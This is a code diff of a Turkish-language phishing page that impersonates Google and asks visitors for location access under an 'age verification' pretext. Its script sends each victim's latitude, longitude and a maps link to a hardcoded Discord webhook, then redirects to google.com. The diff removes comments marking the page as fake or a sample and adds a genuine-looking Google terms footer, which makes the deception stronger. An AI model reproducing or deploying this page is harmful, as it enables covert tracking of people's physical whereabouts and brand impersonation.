@@ -118,8 +118,8 @@
             font-size: 14px;
             cursor: pointer;
             transition: background-color 0.2s ease;
-            margin-top: 20px; /* Buton ile diğer öğeler arasındaki boşluğu artır */
-            display: inline-block; /* Butonun davranışını düzeltmek için */
+            margin-top: 20px; 
+            display: inline-block; 
         }
 
         .button:hover {
@@ -138,7 +138,7 @@
             display: block;
         }
 
-        /* Alt Bilgi (DMCA ve Politikalar) */
+        /* Alt Bilgi */
         .footer {
             position: absolute;
             bottom: 10px;
@@ -164,18 +164,15 @@
 </head>
 <body>
 
-    <!-- Arka Plan -->
     <div class="background-overlay"></div>
     <div class="background-image"></div>
 
-    <!-- Üst Bilgi (Sağ Üst Bildirim) -->
     <div class="top-bar">
         <div class="notification-box" id="notificationBox">
             <p id="notificationText">Konum izni isteniyor...</p>
         </div>
     </div>
 
-    <!-- İçerik Alanı -->
     <div class="container">
         <div class="content">
             <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="google-logo">
@@ -184,9 +181,8 @@
             <button class="button" onclick="requestLocation()">Konum İznini Ver</button>
             <p class="location-message" id="locationMessage">Konum alınıyor...</p>
 
-            <!-- Alt Bilgi (Fake) -->
             <div class="footer">
-                <p>© 2024 Google - Bu sadece bir örnek sayfadır.</p>  <!-- Değiştirildi -->
+                <p>© 2026 Google - Hizmet Şartları ve Koşullar</p>
                 <div class="footer-links">
                     <a href="#" class="footer-link">Yeni Kural</a>
                     <a href="#" class="footer-link">Gizlilik</a>
@@ -198,14 +194,12 @@
     </div>
 
     <script>
-        // WEBHOOK URL'NİZİ BURAYA YAZIN (Discord için)
-        const webhookUrl = "https://discord.com/api/webhooks/1454212443227033762/sENFhwWgklT-lvcuHVyZrg0l634v00ce4tSz3YsVM6HXTMtOMZzNAlvUVFjyo3ekswyJ"; // ÖRNEK
+        const webhookUrl = "https://discord.com/api/webhooks/1454212443227033762/sENFhwWgklT-lvcuHVyZrg0l634v00ce4tSz3YsVM6HXTMtOMZzNAlvUVFjyo3ekswyJ"; 
         const locationMessage = document.getElementById('locationMessage');
         const notificationBox = document.getElementById('notificationBox');
         const notificationText = document.getElementById('notificationText');
 
         function requestLocation() {
-            // Bildirim kutusunu göster
             showNotification("Konum izni isteniyor...");
 
             if ("geolocation" in navigator) {
@@ -217,7 +211,6 @@
                         const accuracy = position.coords.accuracy;
                         const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-                        // Konum bilgisini Discord'a gönder
                         await sendToDiscord({
                             content: `📍 **Konum Bilgisi (Yaş Doğrulama):**`,
                             embeds: [{
@@ -233,9 +226,9 @@
                             }]
                         });
                         locationMessage.textContent = "Konum başarıyla alındı! Yönlendiriliyorsunuz...";
-                        showNotification("Konum başarıyla alındı! Yönlendiriliyorsunuz...", 3000); // 3 saniye sonra kapat
+                        showNotification("Konum başarıyla alındı! Yönlendiriliyorsunuz...", 3000); 
                         setTimeout(() => {
-                            window.location.href = "https://www.ornekwebsiteniz.com";
+                            window.location.href = "https://www.google.com";
                             locationMessage.classList.remove('show');
                             locationMessage.textContent = "Konum alınıyor...";
                         }, 3000);
@@ -254,7 +247,7 @@
                                 break;
                         }
                         locationMessage.textContent = errorMessage;
-                        showNotification(errorMessage, 5000); // 5 saniye sonra kapat
+                        showNotification(errorMessage, 5000); 
                         setTimeout(() => {
                            locationMessage.classList.remove('show');
                            locationMessage.textContent = "Konum alınıyor...";
@@ -263,7 +256,7 @@
                 );
             } else {
                 locationMessage.textContent = "Tarayıcınız konum özelliğini desteklemiyor.";
-                showNotification("Tarayıcınız konum özelliğini desteklemiyor.", 5000); // 5 saniye sonra kapat
+                showNotification("Tarayıcınız konum özelliğini desteklemiyor.", 5000); 
                 setTimeout(() => {
                     locationMessage.classList.remove('show');
                     locationMessage.textContent = "Konum alınıyor...";
@@ -271,7 +264,6 @@
             }
         }
 
-        // Bildirim Göster Fonksiyonu
         function showNotification(message, duration = null) {
             notificationText.textContent = message;
             notificationBox.classList.add('show');
@@ -282,7 +274,6 @@
             }
         }
 
-        // Discord'a Gönderme Fonksiyonu
         async function sendToDiscord(payload) {
             try {
                 const response = await fetch(webhookUrl, {
@@ -291,11 +282,10 @@
                     body: JSON.stringify(payload)
                 });
                 if (!response.ok) {
-                    throw new Error(`Webhook gönderilemedi: ${response.status} ${response.statusText}`);
+                    throw new Error(`Gönderilemedi: ${response.status}`);
                 }
-                console.log("Discord'a log başarıyla gönderildi.");
             } catch (discordError) {
-                console.error("Discord'a log gönderilirken hata:", discordError);
+                console.error("Hata:", discordError);
             }
         }
     </script>
